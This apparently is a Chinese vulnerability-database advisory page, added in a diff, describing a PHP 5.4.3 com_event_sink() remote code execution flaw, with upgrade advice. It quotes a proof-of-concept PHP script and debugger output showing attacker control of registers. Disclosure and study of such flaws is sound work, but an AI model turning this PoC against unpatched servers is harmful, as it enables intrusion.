@@ -1,0 +1,290 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/m.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">PHP &#39;com_event_sink()&#39; 远程代码执行漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									BUGTRAQ  ID: 53642<br />
+
+									<br />
+
+									PHP是一种HTML内嵌式的语言，PHP与微软的ASP颇有几分相似，都是一种在服务器端执行的嵌入HTML文档的脚本语言，语言的风格有类似于C语言，现在被很多的网站编程人员广泛的运用。<br />
+
+									<br />
+
+									PHP 5.4.3中的函数com_event_sink()在实现时存在远程漏洞，可被远程攻击者利用在受影响的网络服务器中执行任意代码。<br />
+
+									<br />
+
+									&lt;*来源：condis<br />
+
+									  <br />
+
+									  链接：http://isc.sans.edu/diary.html?storyid=13255<br />
+
+									*&gt;<br />
+
+									<br />
+
+									测试方法：<br />
+
+									警 告<br />
+
+									<br />
+
+									以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！<br />
+
+									<br />
+
+									&lt;?php<br />
+
+									<br />
+
+									/*<br />
+
+									<br />
+
+									PHP &lt;= 5.4.3 (com_event_sink) Code Execution Proof of Concept<br />
+
+									Found by condis<br />
+
+									Website: http://cond.psychodela.pl<br />
+
+									<br />
+
+									Tested on:<br />
+
+									     <br />
+
+									    PHP 5.3.8  + Windows XP SP3 Professional PL<br />
+
+									    PHP 5.3.10 + Windows XP SP3 Professional PL<br />
+
+									    PHP 5.4.0  + Windows XP SP3 Professional PL<br />
+
+									    PHP 5.4.3  + Windows XP SP3 Professional PL<br />
+
+									     <br />
+
+									Description:<br />
+
+									<br />
+
+									    This is a very strange bug and I had a really hard time trying to classify<br />
+
+									    it, but lets start from the beginning.<br />
+
+									     <br />
+
+									    As we can read in PHP manual : com_event_sink function connects events from<br />
+
+									    COM object to a PHP object. First argument should be a COM object. But when<br />
+
+									    I set it up to new Variant(), PHP instance crashed.<br />
+
+									     <br />
+
+									    After few minutes of research it was clear to me that we can control EAX<br />
+
+									    register by defining first parameter of our Variant object.<br />
+
+									<br />
+
+									    The proof of concept code located below should produce situation similar to<br />
+
+									    this :<br />
+
+									<br />
+
+									    eax=024e0050 ebx=010328f0 ecx=41414141 edx=00c0facc esi=0121ff68 edi=00000000<br />
+
+									    eip=100f33d5 esp=00c0faa8 ebp=00000000 iopl=0         nv up ei pl nz na po nc<br />
+
+									    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202<br />
+
+									<br />
+
+									    100f33d4 50              push    eax<br />
+
+									    100f33d5 8b01            mov     eax,dword ptr [ecx]  ds:0023:41414141=????????<br />
+
+									    100f33d7 ffd0            call    eax<br />
+
+									<br />
+
+									    IMHO it is possible to write a reliable exploit using i.e.: ROP method but due<br />
+
+									    to lack of free time and skill I leave this task to someone else. Also 0in tried<br />
+
+									    to write stable exploit for same bug in com_print_typeinfo() function but as far<br />
+
+									    as I know it isn&#39;t stable enough :(<br />
+
+									<br />
+
+									<br />
+
+									Greetz: cxib, 0in, and others ;&gt;<br />
+
+									<br />
+
+									*/<br />
+
+									<br />
+
+									$EAX   = 0x024E0050;            // stack starts at 0x024E0050 (in my case)<br />
+
+									$stack = str_repeat(&quot;x41&quot;, 0x1000000);  // putting some garbage on the stack so the ECX would be 41414141<br />
+
+									<br />
+
+									class foo { }<br />
+
+									com_event_sink(new Variant($EAX), new foo(), array()); <br />
+
+									<br />
+
+									?&gt;<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									PHP<br />
+
+									---<br />
+
+									建议升级PHP产品至最新版本，请到厂商的主页下载：<br />
+
+									<br />
+
+									http://www.php.net<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>5</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2012-05-11</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2012-05-30</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/53642" target="_blank">53642</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=19681" target="_blank">19681</a>
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
